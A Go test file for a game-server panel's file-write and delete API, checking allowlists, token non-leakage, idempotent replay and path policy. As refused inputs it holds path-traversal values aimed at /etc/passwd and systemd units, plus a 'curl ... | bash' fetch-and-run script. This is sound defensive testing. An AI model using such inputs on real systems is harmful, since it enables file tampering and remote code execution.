package api

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"testing"

	"github.com/FuzzySpace/GlassGamePanel/internal/config"
	"github.com/FuzzySpace/GlassGamePanel/internal/deny"
	"github.com/FuzzySpace/GlassGamePanel/internal/wings"
)

func testJar(n int) []byte {
	if n < 30 {
		n = 30
	}
	b := make([]byte, n)
	copy(b, []byte{0x50, 0x4b, 0x03, 0x04})
	return b
}

func fileURL(id, path string, extra url.Values) string {
	q := url.Values{}
	q.Set("path", path)
	for k, vs := range extra {
		for _, v := range vs {
			q.Add(k, v)
		}
	}
	return "/v1/servers/" + id + "/files/content?" + q.Encode()
}

func (c *cli) doRaw(method, pth, token, idem, requestID, contentType string, body []byte) (int, []byte, http.Header) {
	c.t.Helper()
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, c.base+pth, rdr)
	if err != nil {
		c.t.Fatal(err)
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	if idem != "" {
		req.Header.Set("Idempotency-Key", idem)
	}
	if requestID != "" {
		req.Header.Set("X-Request-Id", requestID)
	}
	resp, err := c.http.Do(req)
	if err != nil {
		c.t.Fatal(err)
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		c.t.Fatal(err)
	}
	return resp.StatusCode, b, resp.Header
}

func TestFilesWriteAllowlistedDialsWings(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	})
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	jar := testJar(64)
	const rid = "req-d2-file-write-0001"
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-put-jar", rid, "application/octet-stream", jar)
	if st != http.StatusOK || hdr.Get("X-Glass-Wings-Dispatch") != "1" || hdr.Get("X-Glass-Executor") != "real" || hdr.Get("X-Request-Id") != rid || hdr.Get("X-Glass-Wings-HTTP-Status") != "204" || srv.WingsAttempts() != 1 {
		t.Fatalf("put %d attempts=%d dispatch=%s req=%s wings=%s %s", st, srv.WingsAttempts(), hdr.Get("X-Glass-Wings-Dispatch"), hdr.Get("X-Request-Id"), hdr.Get("X-Glass-Wings-HTTP-Status"), body)
	}
	if bytes.Contains(body, []byte(testWingsToken)) {
		t.Fatalf("token leaked %s", body)
	}
	var got map[string]any
	if err := json.Unmarshal(body, &got); err != nil {
		t.Fatal(err)
	}
	if got["written"] != true || got["wings_dialed"] != true || got["wings_http_status"] != float64(http.StatusNoContent) || got["request_id"] != rid || got["path"] != "/mods/fabric-api.jar" {
		t.Fatalf("evidence %#v", got)
	}
	seen := hits.snapshot()
	if len(seen) != 1 {
		t.Fatalf("hits %d", len(seen))
	}
	h := seen[0]
	if h.Method != http.MethodPost || h.Path != "/api/servers/"+c2WingsUUID+"/files/write" || h.Auth != "Bearer "+testWingsToken || h.RequestID != rid || h.ContentType != "application/octet-stream" || h.Body != string(jar) {
		t.Fatalf("hit method=%s path=%s auth=%s rid=%s ctype=%s bodylen=%d", h.Method, h.Path, h.Auth, h.RequestID, h.ContentType, len(h.Body))
	}
	q, err := url.ParseQuery(h.Query)
	if err != nil || q.Get("file") != "/mods/fabric-api.jar" {
		t.Fatalf("query %s", h.Query)
	}
	if stringsContain(h.Path+h.Query, testWingsToken) {
		t.Fatal("token on url")
	}

	zip := testJar(40)
	st, body, hdr = c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "/plugins/Vault.zip", nil), c.staff(), "idem-d2-put-zip", "req-d2-file-write-0002", "application/octet-stream", zip)
	if st != http.StatusOK || hdr.Get("X-Glass-Wings-Dispatch") != "1" || srv.WingsAttempts() != 2 || !bytes.Contains(body, []byte(`"path":"/plugins/Vault.zip"`)) {
		t.Fatalf("plugins %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	seen = hits.snapshot()
	if len(seen) != 2 || seen[1].Path != "/api/servers/"+c2WingsUUID+"/files/write" {
		t.Fatalf("second hit %+v", seen)
	}
	q, err = url.ParseQuery(seen[1].Query)
	if err != nil || q.Get("file") != "/plugins/Vault.zip" {
		t.Fatalf("zip query %s", seen[1].Query)
	}
}

func TestFilesWriteAboveOldBodyCapDials(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	})
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	jar := testJar((1 << 20) + 64)
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-large-jar", "req-d2-large-jar-0001", "application/octet-stream", jar)
	if st != http.StatusOK || hdr.Get("X-Glass-Wings-Dispatch") != "1" || srv.WingsAttempts() != 1 {
		t.Fatalf("large put %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	seen := hits.snapshot()
	if len(seen) != 1 || len(seen[0].Body) != len(jar) || seen[0].Body[:4] != string(jar[:4]) {
		t.Fatalf("large hit len=%d", len(seen))
	}
}

func TestFilesWriteOversizeDoesNotDial(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("oversize dialed %s", r.URL.Path)
	})
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	c.http.Timeout = 0
	jar := testJar(wings.MaxWriteBytes + 1)
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-oversize", "req-d2-oversize-0001", "application/octet-stream", jar)
	if st != http.StatusBadRequest || errorCode(body) != "validation_failed" || hdr.Get("X-Glass-Wings-Dispatch") != "0" || srv.WingsAttempts() != 0 {
		t.Fatalf("oversize %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	if len(hits.snapshot()) != 0 {
		t.Fatal("oversize hit wings")
	}
}

func TestFilesWriteNoopDoesNotDial(t *testing.T) {
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("noop dialed %s", r.URL.Path)
	})
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorNoop
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-noop-put", "req-d2-noop-0001", "application/octet-stream", testJar(32))
	if st != http.StatusForbidden || errorCode(body) != "forbidden" || !bytes.Contains(body, []byte(`"reason":"test_files_write_disabled"`)) || !bytes.Contains(body, []byte(`"wings_dispatch":false`)) || hdr.Get("X-Glass-Executor") != "noop" || hdr.Get("X-Glass-Wings-Dispatch") != "0" || srv.WingsAttempts() != 0 {
		t.Fatalf("noop %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	st, body, hdr = c.doRaw(http.MethodDelete, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-noop-del", "", "", nil)
	if st != http.StatusForbidden || hdr.Get("X-Glass-Wings-Dispatch") != "0" || srv.WingsAttempts() != 0 {
		t.Fatalf("noop delete %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	if len(hits.snapshot()) != 0 {
		t.Fatal("noop hit wings")
	}
}

func TestFilesWriteEmptyAllowlistDoesNotDial(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("empty allowlist dialed %s", r.URL.Path)
	})
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-empty", "req-d2-empty-0001", "application/octet-stream", testJar(32))
	if st != http.StatusForbidden || !bytes.Contains(body, []byte(`"reason":"wings_allowlist_empty"`)) || hdr.Get("X-Glass-Wings-Dispatch") != "0" || srv.WingsAttempts() != 0 {
		t.Fatalf("empty %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	if len(hits.snapshot()) != 0 {
		t.Fatal("empty allowlist hit wings")
	}
}

func TestFilesWriteUUIDNotAllowlisted(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("unlisted uuid dialed %s", r.URL.Path)
	})
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(phaseCOtherUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-other", "req-d2-other-0001", "application/octet-stream", testJar(32))
	if st != http.StatusForbidden || !bytes.Contains(body, []byte(`"reason":"wings_uuid_not_allowlisted"`)) || hdr.Get("X-Glass-Wings-Dispatch") != "0" || srv.WingsAttempts() != 0 {
		t.Fatalf("other %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	nodeOnly, err := config.ParseWingsAllowlist("5")
	if err != nil {
		t.Fatal(err)
	}
	srv, c = newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = nodeOnly
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	st, body, hdr = c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-node", "req-d2-node-0001", "application/octet-stream", testJar(32))
	if st != http.StatusForbidden || !bytes.Contains(body, []byte(`"reason":"wings_uuid_not_allowlisted"`)) || hdr.Get("X-Glass-Wings-Dispatch") != "0" || srv.WingsAttempts() != 0 {
		t.Fatalf("node %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	if len(hits.snapshot()) != 0 {
		t.Fatal("unlisted hit wings")
	}
}

func TestFilesWriteManagedInventoryCohortNeverDials(t *testing.T) {
	d, err := deny.Load()
	if err != nil {
		t.Fatal(err)
	}
	allowRaw := c2WingsUUID
	for _, u := range d.UUIDs() {
		allowRaw += "," + u
	}
	allow, err := config.ParseWingsAllowlist(allowRaw)
	if err != nil {
		t.Fatal(err)
	}
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("managed-inventory dialed %s %s", r.Method, r.URL.Path)
	})
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	staff := c.staff()
	jar := testJar(32)
	for _, u := range d.UUIDs() {
		st, body, hdr := c.doRaw(http.MethodPut, fileURL(u, "mods/fabric-api.jar", nil), staff, "idem-d2-sl-"+u[:8], "req-d2-sl-uuid", "application/octet-stream", jar)
		if st != http.StatusForbidden || errorCode(body) != "managed_inventory_denied" || hdr.Get("X-Glass-Wings-Dispatch") != "0" {
			t.Fatalf("uuid %s: %d dispatch=%s %s", u, st, hdr.Get("X-Glass-Wings-Dispatch"), body)
		}
		st, body, hdr = c.doRaw(http.MethodDelete, fileURL(u, "mods/fabric-api.jar", nil), staff, "idem-d2-sld-"+u[:8], "", "", nil)
		if st != http.StatusForbidden || errorCode(body) != "managed_inventory_denied" || hdr.Get("X-Glass-Wings-Dispatch") != "0" {
			t.Fatalf("delete uuid %s: %d %s", u, st, body)
		}
	}
	for _, sid := range d.SIDs() {
		extra := url.Values{}
		extra.Set("sid", itoa(sid))
		st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", extra), staff, "idem-d2-sid-"+itoa(sid), "req-d2-sl-sid", "application/octet-stream", jar)
		if st != http.StatusForbidden || errorCode(body) != "managed_inventory_denied" || hdr.Get("X-Glass-Wings-Dispatch") != "0" {
			t.Fatalf("sid %d: %d dispatch=%s %s", sid, st, hdr.Get("X-Glass-Wings-Dispatch"), body)
		}
	}
	for _, ct := range []string{"210", "211", "1220", "CT1220"} {
		extra := url.Values{}
		extra.Set("whmcs_ct", ct)
		st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "../etc/passwd", extra), staff, "idem-d2-ct-"+ct, "req-d2-sl-ct", "application/octet-stream", jar)
		if st != http.StatusForbidden || errorCode(body) != "managed_inventory_denied" || hdr.Get("X-Glass-Wings-Dispatch") != "0" {
			t.Fatalf("ct %s: %d dispatch=%s %s", ct, st, hdr.Get("X-Glass-Wings-Dispatch"), body)
		}
	}
	if srv.WingsAttempts() != 0 || len(hits.snapshot()) != 0 {
		t.Fatalf("managed-inventory attempts=%d hits=%d", srv.WingsAttempts(), len(hits.snapshot()))
	}
}

func TestFilesWritePathPolicyRefusesBeforeDial(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("path policy dialed %s?%s", r.URL.Path, r.URL.RawQuery)
	})
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	staff := c.staff()
	jar := testJar(32)
	refused := []string{
		"../mods/fabric-api.jar",
		"mods/../../etc/passwd",
		"/mods/../../etc/passwd",
		"/etc/passwd",
		"/etc/systemd/system/panel.service",
		"/lib/systemd/system/foo.service",
		"/usr/bin/bash",
		"//mods/fabric-api.jar",
		"/server.properties",
		"mods/install.sh",
		"mods/evil.service",
		"mods/fabric-api.txt",
		"plugins/../mods/fabric-api.jar",
		"",
	}
	for i, path := range refused {
		st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, path, nil), staff, "idem-d2-path-"+itoa(i), "req-d2-path", "application/octet-stream", jar)
		if st != http.StatusBadRequest || errorCode(body) != "validation_failed" || !bytes.Contains(body, []byte(`"reason":"path_not_allowlisted"`)) || hdr.Get("X-Glass-Wings-Dispatch") != "0" {
			t.Fatalf("path %q: %d dispatch=%s %s", path, st, hdr.Get("X-Glass-Wings-Dispatch"), body)
		}
	}
	script := []byte("#!/bin/bash\ncurl https://example.invalid | bash\n")
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), staff, "idem-d2-script", "req-d2-script", "application/octet-stream", script)
	if st != http.StatusBadRequest || !bytes.Contains(body, []byte(`"reason":"content_not_archive"`)) || hdr.Get("X-Glass-Wings-Dispatch") != "0" {
		t.Fatalf("script %d dispatch=%s %s", st, hdr.Get("X-Glass-Wings-Dispatch"), body)
	}
	if srv.WingsAttempts() != 0 || len(hits.snapshot()) != 0 {
		t.Fatalf("policy attempts=%d hits=%d", srv.WingsAttempts(), len(hits.snapshot()))
	}
}

func TestFilesWriteUnconfiguredFailsClosed(t *testing.T) {
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
	})
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-noconfig", "req-d2-noconfig", "application/octet-stream", testJar(32))
	if st != http.StatusBadGateway || errorCode(body) != "wings_dial_failed" || bytes.Contains(body, []byte(`"wings_dialed":true`)) || hdr.Get("X-Glass-Wings-Dispatch") != "0" || srv.WingsAttempts() != 0 {
		t.Fatalf("unconfigured %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
}

func TestFilesWriteRejectedCountsRoundTrip(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		_, _ = io.WriteString(w, `{"error":"missing `+testWingsToken+`"}`)
	})
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), c.staff(), "idem-d2-reject", "req-d2-reject-0001", "application/octet-stream", testJar(32))
	if st != http.StatusBadGateway || errorCode(body) != "wings_rejected" || !bytes.Contains(body, []byte(`"wings_dialed":true`)) || !bytes.Contains(body, []byte(`"wings_http_status":404`)) || bytes.Contains(body, []byte(testWingsToken)) || hdr.Get("X-Glass-Wings-Dispatch") != "1" || hdr.Get("X-Request-Id") != "req-d2-reject-0001" || srv.WingsAttempts() != 1 {
		t.Fatalf("reject %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	if len(hits.snapshot()) != 1 {
		t.Fatalf("hits %d", len(hits.snapshot()))
	}
}

func TestFilesWriteReplayDoesNotRedial(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	})
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	jar := testJar(32)
	staff := c.staff()
	st, _, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), staff, "idem-d2-replay", "req-d2-replay-0001", "application/octet-stream", jar)
	if st != http.StatusOK || hdr.Get("X-Glass-Wings-Dispatch") != "1" || srv.WingsAttempts() != 1 {
		t.Fatalf("first %d attempts=%d", st, srv.WingsAttempts())
	}
	st, body, hdr := c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), staff, "idem-d2-replay", "req-d2-replay-0002", "application/octet-stream", jar)
	if st != http.StatusOK || hdr.Get("Idempotency-Replay") != "true" || srv.WingsAttempts() != 1 || len(hits.snapshot()) != 1 {
		t.Fatalf("replay %d attempts=%d hits=%d %s", st, srv.WingsAttempts(), len(hits.snapshot()), body)
	}
	st, body, _ = c.doRaw(http.MethodPut, fileURL(c2WingsUUID, "mods/fabric-api.jar", nil), staff, "idem-d2-replay", "req-d2-replay-0003", "application/octet-stream", testJar(48))
	if st != http.StatusConflict || srv.WingsAttempts() != 1 || len(hits.snapshot()) != 1 {
		t.Fatalf("conflict %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
}

func TestFilesDeleteAllowlistedDialsWings(t *testing.T) {
	wingsSrv, hits := newRecordingWings(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	})
	allow, err := config.ParseWingsAllowlist(c2WingsUUID)
	if err != nil {
		t.Fatal(err)
	}
	srv, c := newConfiguredHarness(t, func(cfg *config.Config) {
		cfg.WingsExecutor = config.WingsExecutorReal
		cfg.WingsAllowlist = allow
		cfg.WingsBaseURL = wingsSrv.URL
		cfg.WingsToken = testWingsToken
	})
	const rid = "req-d2-file-delete-0001"
	st, body, hdr := c.doRaw(http.MethodDelete, fileURL(c2WingsUUID, "mods/subdir/fabric-api.jar", nil), c.staff(), "idem-d2-delete", rid, "", nil)
	if st != http.StatusOK || hdr.Get("X-Glass-Wings-Dispatch") != "1" || hdr.Get("X-Glass-Wings-HTTP-Status") != "204" || hdr.Get("X-Request-Id") != rid || srv.WingsAttempts() != 1 {
		t.Fatalf("delete %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
	if !bytes.Contains(body, []byte(`"deleted":true`)) || !bytes.Contains(body, []byte(`"wings_dialed":true`)) || bytes.Contains(body, []byte(testWingsToken)) {
		t.Fatalf("body %s", body)
	}
	seen := hits.snapshot()
	if len(seen) != 1 || seen[0].Method != http.MethodPost || seen[0].Path != "/api/servers/"+c2WingsUUID+"/files/delete" || seen[0].ContentType != "application/json" || seen[0].RequestID != rid || seen[0].Auth != "Bearer "+testWingsToken {
		t.Fatalf("hit %+v", seen)
	}
	if seen[0].Body != `{"root":"/mods/subdir","files":["fabric-api.jar"]}` {
		t.Fatalf("delete body %s", seen[0].Body)
	}
	st, body, hdr = c.doRaw(http.MethodDelete, fileURL(c2WingsUUID, "/etc/passwd", nil), c.staff(), "idem-d2-delete-escape", "req-d2-delete-escape", "", nil)
	if st != http.StatusBadRequest || !bytes.Contains(body, []byte(`"reason":"path_not_allowlisted"`)) || hdr.Get("X-Glass-Wings-Dispatch") != "0" || srv.WingsAttempts() != 1 || len(hits.snapshot()) != 1 {
		t.Fatalf("delete escape %d attempts=%d %s", st, srv.WingsAttempts(), body)
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b [16]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	return string(b[i:])
}

func stringsContain(s, sub string) bool {
	return len(sub) > 0 && bytes.Contains([]byte(s), []byte(sub))
}
